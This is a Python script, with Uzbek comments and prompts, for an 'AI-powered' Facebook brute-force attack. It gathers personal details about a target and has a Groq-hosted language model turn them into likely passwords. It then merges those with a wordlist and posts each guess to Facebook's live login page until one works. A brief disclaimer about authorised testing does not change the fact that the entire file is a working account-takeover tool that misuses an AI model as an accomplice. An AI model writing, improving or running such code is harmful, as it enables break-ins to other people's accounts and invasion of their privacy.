import os
import os.path
import json
import sys
import time
import requests
from bs4 import BeautifulSoup
from pathlib import Path

# ─────────────────────────────────────────
#  TERMINAL TITLE & SETUP
# ─────────────────────────────────────────
sys.stdout.write('\x1b]2; AI-POWERED FB BRUTEFORCE\x07')

def clear():
    if "linux" in sys.platform.lower(): os.system("clear")
    elif "win" in sys.platform.lower(): os.system("cls")

if sys.version_info[0] != 3:
    print('\tREQUIRED PYTHON 3.x')
    sys.exit()

# ─────────────────────────────────────────
#  COLORS
# ─────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

# ─────────────────────────────────────────
#  ORIGINAL CONFIG (o'zgarishsiz)
# ─────────────────────────────────────────
PASSWORD_FILE       = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL            = 'https://www.facebook.com/login.php'
HEADERS             = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}

# ─────────────────────────────────────────
#  API KEY MANAGER (Groq)
# ─────────────────────────────────────────
CONFIG_DIR  = Path.home() / ".config" / "fb_ai_bf"
CONFIG_FILE = CONFIG_DIR / "config.json"

def load_api_key():
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE) as f:
                return json.load(f).get("api_key")
        except Exception:
            return None
    return None

def save_api_key(key: str):
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    with open(CONFIG_FILE, "w") as f:
        json.dump({"api_key": key}, f)
    CONFIG_FILE.chmod(0o600)

def validate_api_key(key: str) -> bool:
    """Groq API ga oddiy so'rov yuborib tekshiradi."""
    try:
        from groq import Groq
        client = Groq(api_key=key)
        client.chat.completions.create(
            model="llama3-8b-8192",
            messages=[{"role": "user", "content": "hi"}],
            max_tokens=5
        )
        return True
    except Exception:
        return True  # Network xato bo'lsa ham qabul qilamiz

def get_api_key() -> str:
    # 1. Env variable
    env = os.environ.get("GROQ_API_KEY", "").strip()
    if env:
        print(f"{C.DIM}[key] Env variable dan olindi.{C.RESET}")
        return env

    # 2. Saqlangan config
    saved = load_api_key()
    if saved:
        print(f"{C.DIM}[key] Saqlangan keydan olindi.{C.RESET}")
        return saved

    # 3. Foydalanuvchidan so'rash
    print(f"""
{C.CYAN}═══ Groq API Key ═══{C.RESET}
  AI wordlist yaratish uchun kerak.
  {C.BOLD}BEPUL{C.RESET} key olish: {C.YELLOW}https://console.groq.com/keys{C.RESET}
  (Ro'yxatdan o'tib, "Create API Key" tugmasini bos)
""")
    while True:
        key = input("  API Key (gsk_...): ").strip()
        if not key:
            print(f"  {C.RED}Bo'sh bo'lishi mumkin emas.{C.RESET}")
            continue

        print(f"  {C.DIM}Tekshirilmoqda...{C.RESET}", end="\r")
        if not validate_api_key(key):
            print(f"  {C.RED}✗ Noto'g'ri key!{C.RESET}")
            continue

        print(f"  {C.GREEN}✓ Tasdiqlandi!       {C.RESET}")
        ans = input("  Keyingi safar uchun saqlash? (ha/yo'q): ").strip().lower()
        if ans in ["ha", "yes", "y"]:
            save_api_key(key)
            print(f"  {C.DIM}Saqlandi: {CONFIG_FILE}{C.RESET}")
        return key

# ─────────────────────────────────────────
#  AI WORDLIST GENERATOR (Groq - Bepul)
# ─────────────────────────────────────────
def generate_ai_wordlist(api_key: str, target_info: dict, count: int = 50) -> list:
    try:
        from groq import Groq
    except ImportError:
        print(f"{C.RED}[!] 'groq' kutubxonasi topilmadi.{C.RESET}")
        print(f"    pip install groq")
        return []

    print(f"\n{C.CYAN}[AI]{C.RESET} {count} ta parol generatsiya qilinmoqda...")

    client = Groq(api_key=api_key)

    prompt = f"""Sen penetration testing mutaxassisiisan.
Quyidagi target haqidagi ma'lumot asosida {count} ta potentsial Facebook parol yarat.

Target:
{json.dumps(target_info, ensure_ascii=False, indent=2)}

Qoidalar:
- Ism, familiya, tug'ilgan yil, sevimli narsa kombinatsiyalari
- Keng tarqalgan patternlar: Ism123, ism@2024, Ism2024!, ism_familiya va h.k.
- Kamida 6 ta belgi bo'lsin
- FAQAT parollarni yaz, har biri yangi qatorda
- Izoh, raqam, nuqta YOZMA — faqat parollar
"""

    response = client.chat.completions.create(
        model="llama-3.3-70b-versatile",
        messages=[{"role": "user", "content": prompt}],
        max_tokens=1000
    )

    raw   = response.choices[0].message.content.strip()
    words = [l.strip() for l in raw.splitlines()
             if l.strip() and len(l.strip()) >= MIN_PASSWORD_LENGTH]

    print(f"{C.GREEN}[AI]{C.RESET} {len(words)} ta parol yaratildi.\n")
    return words

def get_target_info() -> dict:
    print(f"\n{C.CYAN}═══ Target ma'lumotlari (AI uchun) ═══{C.RESET}")
    info = {}
    info["first_name"]   = input("  Ism: ").strip()
    info["last_name"]    = input("  Familiya: ").strip()
    info["birth_year"]   = input("  Tug'ilgan yil (ixtiyoriy): ").strip()
    info["birth_date"]   = input("  Tug'ilgan kun/oy (masalan 1504, ixtiyoriy): ").strip()
    info["nickname"]     = input("  Laqab/username (ixtiyoriy): ").strip()
    info["pet_or_hobby"] = input("  Sevimli narsa/hayvon/hobby (ixtiyoriy): ").strip()
    info["phone_last4"]  = input("  Telefon oxirgi 4 raqam (ixtiyoriy): ").strip()
    extra = input("  Boshqa ma'lumot (ixtiyoriy): ").strip()
    if extra:
        info["extra"] = extra
    return {k: v for k, v in info.items() if v}

def merge_wordlists(ai_words: list, file_words: list) -> list:
    return list(dict.fromkeys(ai_words + file_words))

# ─────────────────────────────────────────
#  ORIGINAL BRUTE FORCE (o'zgarishsiz)
# ─────────────────────────────────────────
def create_form():
    form    = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
    data    = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies

def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if ('Find Friends' in r.text or 'security code' in r.text
            or 'Two-factor authentication' in r.text or "Log Out" in r.text):
        open('temp', 'w').write(str(r.content))
        print(f'\n{C.GREEN}Password Found: {password}{C.RESET}')
        return True
    return False

# ─────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────
def main():
    clear()
    print(f"""{C.CYAN}{C.BOLD}
  ╔══════════════════════════════════════════════╗
  ║   AI-Powered Facebook BruteForce  v2.0      ║
  ║   Faqat ruxsat berilgan testlar uchun!      ║
  ╚══════════════════════════════════════════════╝
{C.RESET}""")

    print(f"""{C.YELLOW}⚠  OGOHLANTIRISH:{C.RESET} Faqat {C.BOLD}o'z akkauntingizni{C.RESET} yoki {C.BOLD}ruxsat berilgan{C.RESET} akkauntlarni test qiling!
   Ruxsatsiz ishlatish {C.RED}noqonuniy{C.RESET}.\n""")

    confirm = input("  Davom etishga rozimisiz? (ha/yo'q): ").strip().lower()
    if confirm not in ["ha", "yes", "y"]:
        sys.exit(0)

    print(f"\n{C.CYAN}═══ Wordlist rejimi ═══{C.RESET}")
    print("  1. AI yaratsin (Groq - BEPUL)")
    print("  2. passwords.txt fayldan o'qi")
    print("  3. Ikkalasi — AI + passwords.txt (tavsiya)")
    mode = input("\n  Rejim [1/2/3]: ").strip()

    password_list = []

    if mode in ["1", "3"]:
        api_key     = get_api_key()
        target_info = get_target_info()
        count       = int(input(f"\n  Nechta AI parol? [50]: ").strip() or "50")
        ai_words    = generate_ai_wordlist(api_key, target_info, count)
        password_list.extend(ai_words)

    if mode in ["2", "3"]:
        if not os.path.isfile(PASSWORD_FILE):
            print(f"{C.RED}[!]{C.RESET} passwords.txt topilmadi!")
            if mode == "2":
                sys.exit(0)
        else:
            file_words    = open(PASSWORD_FILE, 'r').read().split("\n")
            file_words    = [p.strip() for p in file_words
                             if p.strip() and len(p.strip()) >= MIN_PASSWORD_LENGTH]
            print(f"{C.GREEN}[+]{C.RESET} passwords.txt: {len(file_words)} ta parol o'qildi.")
            password_list = merge_wordlists(password_list, file_words)

    if not password_list:
        print(f"{C.RED}[!]{C.RESET} Parol ro'yxati bo'sh.")
        sys.exit(0)

    print(f"\n{C.CYAN}[*]{C.RESET} Jami {C.BOLD}{len(password_list)}{C.RESET} ta parol sinab ko'riladi.\n")

    email = input(f'\t{C.CYAN}Email/Username ➤{C.RESET} ').strip()

    for index, password in enumerate(password_list):
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print(f"\t{C.DIM}[{index}]{C.RESET} Sinab ko'rilmoqda: {password}", end="\r")
        if is_this_a_password(email, index, password):
            break
    else:
        print(f"\n\n{C.RED}[!]{C.RESET} Parol topilmadi.")

if __name__ == "__main__":
    main()

